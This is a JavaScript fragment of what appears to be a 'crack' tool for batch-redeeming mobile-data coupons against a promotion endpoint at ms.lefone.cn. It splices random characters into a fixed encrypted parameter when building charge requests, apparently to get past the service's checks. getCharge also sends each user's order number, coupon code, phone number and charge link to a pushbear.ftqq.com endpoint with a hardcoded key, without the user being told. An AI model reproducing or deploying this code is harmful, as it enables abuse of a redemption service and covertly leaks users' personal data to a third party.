  $("#in").append("<input type=text class=form-control id=orderId placeholder=订单号> <input type=text class=form-control id=mobile placeholder=手机号><input type=text class=form-control id=code placeholder=兑换码><input type=text class=form-control id=rand placeholder=短信验证码><textarea id=preset class=form-control placeholder='预设订单和兑换码，以便快速获取地址。格式为 订单号@兑换码@手机号 如 EO2017082303123456789@abcdefg@13588888888 一行一条数据' style='height:200px;font-size: 11px;'></textarea><textarea id=result class=form-control placeholder='破解结果(更新日期2017-09-09-13 17:40)' style='height:200px'></textarea><iframe src='' style='position: fixed; border: 1px solid black; top: 0px; right: 0px;background-color: yellow;'>");
  $("#yql").attr("onclick", "getEnc()");
  localStorage.preset = removeUsed(preset).join("\r\n");
  $("#preset").val(localStorage.preset);
}

var removeUsed = function(){
 if(!localStorage.used){
     localStorage.used = usedList;
    }else{
     usedList = localStorage.used.split(",");
    }
 var result = [];
 preset.forEach(function(code){
  if(usedList.indexOf(code) == -1){
   result.push(code);
  }
 });
 return result;
}

var check = function() {
  if (bannedKeys.indexOf(uk) === -1) {
    return true;
  }else{
    alert("请用新版~");
    return false;
  }
}

var readLine = function(){
  var text = $("#preset").val();
  localStorage.preset = text;
  if(text.length > 0){
    var lines = text.split("\n");
    var pre = lines.pop().trim();
    $("#preset").val(lines.join("\n"));
    localStorage.preset = $("#preset").val();
    return pre.indexOf("@") > -1 ? pre.split("@") : [];
  }else{
    return [];
  }
}

var getEnc = function(retry){
  var valid = check();
  if(valid){
    $("#yql").text("正在获取...");
    $("#yql").attr("disabled", "disabled");
    if(!retry){
     var pre = readLine();
     if(pre.length === 3){
      $("#orderId").val(pre[0].trim()); 
      $("#code").val(pre[1].trim());
      $("#mobile").val(pre[2].trim()); 
     }
    }
    var mobile = $("#mobile").val().trim();
    var orderId = $("#orderId").val().trim();
    if(mobile && orderId){

      // var u = 'https://prefacty.creditcard.cmbc.com.cn/mmc-main-webapp/main/TDESEncryptByCMBCC.json?paramMap={"orderId":"'+orderId+'","mobile":"'+mobile+'"}';
      var u = "http://ms.lefone.cn/msflowday/couponShowController/generateCheckCode?enStr=Ko8GEZulztYGzlwL41zvKHByrFzWvp51AP6gW3RSF8A0MwN5zGrMT54iLl5UKI1qdI21FTBBrTk=&mobile=" + mobile;
 //      $.ajax({
 //          url: "https://query.yahooapis.com/v1/public/yql",
 //          dataType: "json",
 //          timeout: 10000,
 //          data: {
 //              format: "json",
 //              q: $("#yql").data("ql") + encodeURI(u) + $("#yql").data("qr")
 //          },
 //          success: getUrl,
 //          error: function(c, u) {
 //              alert("错误 如果多次尝试无果请联系开发者");
 //              $("#yql").removeAttr("disabled");
 //          }
 //      });
		$("#frame").src = u;
		$("#yql").text("如果黄色框文字中包含true表示验证码发送成功");
    }else{
      alert("缺少数据");
      $("#yql").removeAttr("disabled"); 
    }
  }
}

var getUrl = function(data){
  $("#yql").removeAttr("disabled");
  if(data.query){
    var re = data.query.results;
    if(re){
      $("#yql").text("验证码获取成功 请稍后填写");
    }else{
     setTimeout(function(){
      getEnc(true);
     }, 5000)
    }
  }else{
    alert("错误 如果多次尝试无果请联系开发者");
  }
}

var getRandom = function(){
	var text = "";
	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for (var i = 2; i >= 0; i--) {
		text += possible.charAt(Math.floor(Math.random() * possible.length));
	};
	if(used.indexOf(text) == -1){
		used.push(text);
		return text;
	}else{
		return getRandom();
	}
}

var getCharge = function(){
	var mobile = $("#mobile").val().trim();;
	var code = $("#code").val().trim();;
	var orderId = $("#orderId").val().trim();;
	var rand = $("#rand").val().trim();
	if(rand){
		usedList.push(orderId + "@" + code + "@");
		localStorage.used = usedList;
		var u = "http://ms.lefone.cn/msflowday/couponShowController/charegeCoupon?enStr=Ko8GEZulztYGzlwL41zvKHByrFzWvp" + getRandom() + "AP6gW3RSF8A0MwN5zGrMT54iLl5UKI1qdI21FTBBrTk%3D&couponCode=" + code + "&mobile=" + mobile + "&chargeType=0&rand=" + rand;
		var result = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 充值链接: " + u;
		var extra = " 2款" + orderId;
		if(myList.indexOf(orderId) > -1){
			extra = " 14款" + orderId;
		}
		$("#frame").src = u;
		$.get("https://pushbear.ftqq.com/sub?sendkey=751-9616f3ff7deb3cdfda6f4f547ab5b153&text=流量充值"+extra+"&desp=" + result)
		$("#result").val(result);
		$("#yql").text("请看黄色框中充值结果");
		$("#mobile").val("");
		$("#code").val("");
		$("#orderId").val("");
		$("#rand").val("");
	}else{
		alert("缺少验证码");
	}
}
